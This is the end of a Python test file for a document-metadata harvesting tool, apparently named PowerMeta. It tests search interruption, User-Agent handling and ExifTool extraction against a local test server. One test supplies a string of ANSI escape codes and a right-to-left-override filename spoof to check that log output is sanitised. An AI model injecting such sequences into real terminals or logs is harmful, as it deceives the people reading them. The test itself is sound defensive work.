                code, output = run_cli(["--list-in", listed, "--download", "--extract", "-o", out + "2"])
            self.assertEqual(code, 1, output)
            self.assertIn("[*] Downloaded 1 files", output)
            self.assertIn("ExifTool was not found", output)

    def test_ctrl_c_during_the_search_keeps_what_was_found_and_downloads_nothing(self):
        def interrupted(*args, **kwargs):
            raise KeyboardInterrupt

        out = os.path.join(self.folder, "out")
        listed = os.path.join(self.folder, "links.txt")
        with patched(sources, search_bing=interrupted):
            code, output, server = self.run_with_server(
                ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out, "--list-out", listed]
            )
        self.assertEqual(code, 130, output)
        self.assertIn("Interrupted: the search stops here", output)
        self.assertIn("[*] A total of 2 files were discovered.", output)
        self.assertFalse(os.path.exists(out))
        with open(listed) as saved:
            self.assertEqual(saved.read().split(), [server.url + "/files/report.pdf", server.url + "/gone.pdf"])

        # Without --list-out the links are shown, so that they are not lost
        with patched(sources, search_bing=interrupted):
            code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out])
        self.assertEqual(code, 130, output)
        self.assertIn("\n%s/gone.pdf\n" % server.url, output)
        self.assertFalse(os.path.exists(out))

    def test_ctrl_c_during_the_downloads_ends_the_run_without_a_traceback(self):
        def interrupted(*args, **kwargs):
            raise KeyboardInterrupt

        with patched(cli, download=interrupted):
            code, output, _ = self.run_with_server(
                ["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--download", "-o", os.path.join(self.folder, "out")]
            )
        self.assertEqual(code, 130, output)
        self.assertIn("[!] Interrupted.", output)

    def test_the_internet_archive_is_told_that_this_is_a_program(self):
        out = os.path.join(self.folder, "out")
        code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out])
        self.assertEqual(code, 0, output)
        agents = {}
        for request in server.requests:
            agents.setdefault(request.path.split("/")[1], set()).add(request.headers.get("User-Agent"))
        self.assertEqual(agents["cdx"], {web.PROGRAM_USER_AGENT})
        self.assertEqual(agents["web"], {web.PROGRAM_USER_AGENT})  # the Archive's copy of a file that is gone
        self.assertEqual(agents["bing"], {web.DEFAULT_USER_AGENT})
        self.assertEqual(agents["files"], {web.DEFAULT_USER_AGENT})
        self.assertRegex(web.PROGRAM_USER_AGENT, r"^PowerMeta/\d")

        # A User-Agent that was asked for is used everywhere
        code, output, server = self.run_with_server(
            ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", out + "2", "--user-agent", "Example/1.0"]
        )
        self.assertEqual({request.headers.get("User-Agent") for request in server.requests}, {"Example/1.0"})

    def test_text_from_outside_cannot_steer_the_terminal(self):
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            cli.log("author \x1b[31mred\x07 \u202egnp.exe\rover\x9b2J")
            cli.log("two\nlines\tand a tab stay")
        self.assertEqual(output.getvalue(), "author ?[31mred? ?gnp.exe?over?2J\ntwo\nlines\tand a tab stay\n")

    @unittest.skipUnless(EXIFTOOL, "ExifTool is not installed")
    def test_extract_dir(self):
        write_pdf(os.path.join(self.folder, "one.pdf"), "jsmith", "Writer")
        target = os.path.join(self.folder, "all.csv")
        code, output = run_cli(["--extract-dir", self.folder, "--csv", target])
        self.assertEqual(code, 0, output)
        self.assertIn("Metadata for 1 files was written", output)
        code, output = run_cli(["--extract-dir", os.path.join(self.folder, "missing")])
        self.assertEqual(code, 1)


if __name__ == "__main__":
    unittest.main()
